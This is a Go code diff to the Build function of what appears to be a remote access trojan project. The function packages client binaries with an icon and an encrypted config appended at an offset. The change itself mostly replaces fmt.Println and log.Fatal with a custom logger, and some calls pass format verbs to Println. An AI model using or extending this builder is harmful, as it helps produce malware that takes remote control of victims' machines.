@@ -5,11 +5,10 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
-	"fmt"
 	"io"
 	"io/ioutil"
-	"log"
 	"os"
+	"rat/command/log"
 	"rat/shared"
 	"rat/shared/crypto"
 	"rat/shared/installpath"
@@ -38,10 +37,10 @@ type file struct {
 }
 
 func Build(c *Config) (string, string, error) {
-	fmt.Println("Starting build...")
-	fmt.Println("Target OS:", c.TargetOS)
-	fmt.Println("Target Arch:", c.TargetArch)
-	fmt.Println(*c)
+	log.Println("Starting build...")
+	log.Println("Target OS:", c.TargetOS)
+	log.Println("Target Arch:", c.TargetArch)
+	log.Println("%#v", *c)
 
 	var oss []string
 	var archs []string
@@ -66,19 +65,19 @@ func Build(c *Config) (string, string, error) {
 		InvalidSSL: c.InvalidSSL,
 	}
 
-	fmt.Println("Encoded config:", config)
+	log.Println("Encoded config:", config)
 
 	var options []optionpair
 
 	if c.Manifest.IconData != "" {
 		icon, err := ioutil.TempFile("", "icon")
 		if err != nil {
-			fmt.Println("icon:", err.Error())
+			log.Println("icon:", err.Error())
 		}
 
 		data, err := base64.StdEncoding.DecodeString(c.Manifest.IconData)
 		if err != nil {
-			fmt.Println("icon:", err.Error())
+			log.Println("icon:", err.Error())
 		}
 
 		icon.Write(data)
@@ -124,7 +123,7 @@ func Build(c *Config) (string, string, error) {
 
 			files = append(files, file{binName, temp.Name()})
 
-			fmt.Println(temp.Name())
+			log.Println(temp.Name())
 
 			io.Copy(temp, bin)
 
@@ -135,7 +134,7 @@ func Build(c *Config) (string, string, error) {
 
 			offset := int32(stat.Size()) // 32 bit integer
 
-			fmt.Println("Offset:", offset)
+			log.Println("Offset:", offset)
 
 			key := crypto.GenerateKey()
 			iv := crypto.GenerateIv()
@@ -165,19 +164,19 @@ func Build(c *Config) (string, string, error) {
 	for _, file := range files {
 		f, err := z.Create(file.Name)
 		if err != nil {
-			log.Fatal(err)
+			log.Println("%s", err)
 		}
 		tt, _ := os.Open(file.Path)
 		_, err = io.Copy(f, tt)
 		if err != nil {
-			log.Fatal(err)
+			log.Println("%s", err)
 		}
 	}
 
 	z.Close()
 	tz.Close()
 
-	fmt.Println(tz.Name())
+	log.Println(tz.Name())
 
 	return tz.Name(), "build.zip", nil
 }
